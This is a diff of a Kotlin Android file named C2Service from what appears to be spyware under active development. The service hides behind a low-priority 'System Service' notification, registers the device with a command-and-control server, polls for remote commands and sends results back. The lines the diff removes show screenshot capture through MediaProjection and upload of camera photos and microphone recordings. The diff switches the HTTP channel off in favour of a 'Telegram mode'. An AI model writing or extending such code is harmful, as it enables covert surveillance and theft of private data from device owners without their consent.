@@ -4,12 +4,8 @@ import android.app.*
 import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
-import android.media.projection.MediaProjection
-import android.media.projection.MediaProjectionManager
 import android.os.Build
-import android.os.Handler
 import android.os.IBinder
-import android.os.Looper
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import kotlinx.coroutines.*
@@ -20,12 +16,17 @@ import org.json.JSONArray
 import org.json.JSONObject
 import java.util.concurrent.TimeUnit
 
+/**
+ * Legacy HTTP C2 service. Disabled by default when using Telegram mode.
+ * It no longer consumes MediaProjection tokens.
+ */
 class C2Service : Service() {
 
     companion object {
         private const val TAG = "C2Service"
         private const val NOTIF_ID = 1
         private const val CHANNEL_ID = "c2"
+        private const val ENABLED = false   // ← عطّلناه لأننا في وضع Telegram
     }
 
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
@@ -37,9 +38,6 @@ class C2Service : Service() {
     private val deviceId: String by lazy { DeviceInfo.id(this) }
     private lateinit var serverUrl: String
 
-    @Volatile private var projection: MediaProjection? = null
-    @Volatile private var captureSession: ScreenCaptureSession? = null
-
     private fun log(msg: String) {
         Log.i(TAG, msg)
         LogBus.append(applicationContext, "C2", msg)
@@ -47,36 +45,22 @@ class C2Service : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        log("onCreate deviceId=$deviceId")
         startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-
+        if (!ENABLED) {
+            log("C2Service disabled (Telegram mode active)")
+            stopSelf()
+            return
+        }
+        log("onCreate deviceId=$deviceId")
         serverUrl = getSharedPreferences("c2", MODE_PRIVATE)
             .getString("server_url", BuildConfig.C2_URL)!!
-        log("serverUrl=$serverUrl")
-
         scope.launch { registerLoop() }
         scope.launch { pollLoop() }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        log("onStartCommand action=${intent?.action}")
-
-        if (intent?.action == "START_PROJECTION") {
-            val code = intent.getIntExtra("proj_result_code", Int.MIN_VALUE)
-            val data: Intent? = if (Build.VERSION.SDK_INT >= 33)
-                intent.getParcelableExtra("proj_data", Intent::class.java)
-            else
-                @Suppress("DEPRECATION") intent.getParcelableExtra("proj_data")
-
-            log("START_PROJECTION code=$code hasData=${data != null}")
-
-            if (code != Int.MIN_VALUE && data != null) {
-                startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
-                initProjectionFromIntent(code, data)
-            } else {
-                log("START_PROJECTION invalid: code=$code")
-            }
-        }
+        if (!ENABLED) return START_NOT_STICKY
+        // Never touch MediaProjection from here
         return START_STICKY
     }
 
@@ -93,44 +77,6 @@ class C2Service : Service() {
         }
     }
 
-    private fun initProjectionFromIntent(resultCode: Int, data: Intent) {
-        log("initProjection: code=$resultCode")
-        try {
-            // Clean up previous session
-            captureSession?.release()
-            captureSession = null
-            try { projection?.stop() } catch (_: Exception) {}
-            projection = null
-
-            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-            val proj = mpm.getMediaProjection(resultCode, data)
-            log("getMediaProjection: $proj")
-            if (proj == null) {
-                log("getMediaProjection returned NULL")
-                return
-            }
-
-            proj.registerCallback(object : MediaProjection.Callback() {
-                override fun onStop() {
-                    log("projection onStop")
-                    captureSession?.release()
-                    captureSession = null
-                    projection = null
-                }
-            }, Handler(Looper.getMainLooper()))
-
-            projection = proj
-
-            // Build the long-lived virtual display session ONCE
-            captureSession = ScreenCaptureSession(this, proj)
-            log("projection ACTIVE with capture session")
-        } catch (e: Exception) {
-            log("initProjection ERROR: ${e.message}")
-            projection = null
-            captureSession = null
-        }
-    }
-
     override fun onBind(intent: Intent?): IBinder? = null
 
     private fun buildNotification(): Notification {
@@ -143,12 +89,9 @@ class C2Service : Service() {
             .setContentTitle("System Service")
             .setContentText("running")
             .setSmallIcon(android.R.drawable.stat_sys_download)
-            .setPriority(Compat_PRIORITY_MIN())
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .build()
     }
-
-    // Helper to avoid unresolved reference in some SDKs
-    private fun Compat_PRIORITY_MIN() = NotificationCompat.PRIORITY_MIN
 
     private suspend fun registerLoop() {
         while (currentCoroutineContext().isActive) {
@@ -168,7 +111,6 @@ class C2Service : Service() {
                 val body = JSONObject().put("device_id", deviceId)
                 val resp = postJson("$serverUrl/api/agent/poll", body)
                 val cmds = resp?.optJSONArray("commands") ?: JSONArray()
-                if (cmds.length() > 0) log("received ${cmds.length()} commands")
                 for (i in 0 until cmds.length()) {
                     val cmd = cmds.getJSONObject(i)
                     scope.launch { execute(cmd) }
@@ -184,57 +126,18 @@ class C2Service : Service() {
         val id = cmd.getInt("id")
         val type = cmd.getString("type")
         val args = cmd.optJSONObject("args") ?: JSONObject()
-        log("execute id=$id type=$type")
-
+        // Screenshot not supported in legacy mode when Telegram handles projection
         val result = try {
-            when (type) {
-                "screenshot" -> {
-                    val session = captureSession
-                    if (session == null) {
-                        log("screenshot: session NULL")
-                        JSONObject().put("error", "projection_not_ready")
-                    } else {
-                        log("screenshot: capturing...")
-                        session.capture()
-                    }
-                }
-                else -> CommandExecutor.run(this, type, args)
-            }
+            CommandExecutor.run(this, type, args)
         } catch (e: Exception) {
-            log("execute failed: ${e.message}")
             JSONObject().put("error", e.message ?: "unknown")
         }
-
-        val ok = !result.has("error")
-        log("result id=$id type=$type ok=$ok")
-
         val payload = JSONObject()
             .put("command_id", id)
             .put("device_id", deviceId)
-            .put("success", ok)
+            .put("success", !result.has("error"))
             .put("result", result)
         try { postJson("$serverUrl/api/agent/result", payload) } catch (_: Exception) {}
-
-        val dataB64 = result.optString("data_b64", "")
-        if (dataB64.isNotEmpty()) {
-            val category = when (type) {
-                "screenshot" -> "screenshot"
-                "camera_photo" -> "camera"
-                "mic_record" -> "mic"
-                else -> "misc"
-            }
-            val ext = when (type) {
-                "screenshot", "camera_photo" -> "jpg"
-                "mic_record" -> "m4a"
-                else -> "bin"
-            }
-            try {
-                Uploader.uploadB64(this, serverUrl, deviceId, id, category, dataB64, "$type.$ext")
-                log("uploaded $type.$ext (${dataB64.length / 1024} KB)")
-            } catch (e: Exception) {
-                log("upload failed: ${e.message}")
-            }
-        }
     }
 
     private suspend fun postJson(url: String, body: JSONObject): JSONObject? =
@@ -244,17 +147,12 @@ class C2Service : Service() {
                 .addHeader("X-Api-Key", BuildConfig.API_KEY)
                 .post(body.toString().toRequestBody("application/json".toMediaType()))
                 .build()
-            client.newCall(req).execute().use { r ->
-                r.body?.string()?.let { JSONObject(it) }
-            }
+            val raw = client.newCall(req).execute().use { r -> r.body?.string() }
+            if (raw == null) return@withContext null
+            try { JSONObject(raw) } catch (_: Exception) { null }   // ← يتجاهل HTML warning
         }
 
     override fun onDestroy() {
-        log("onDestroy")
-        captureSession?.release()
-        captureSession = null
-        try { projection?.stop() } catch (_: Exception) {}
-        projection = null
         scope.cancel()
         super.onDestroy()
     }
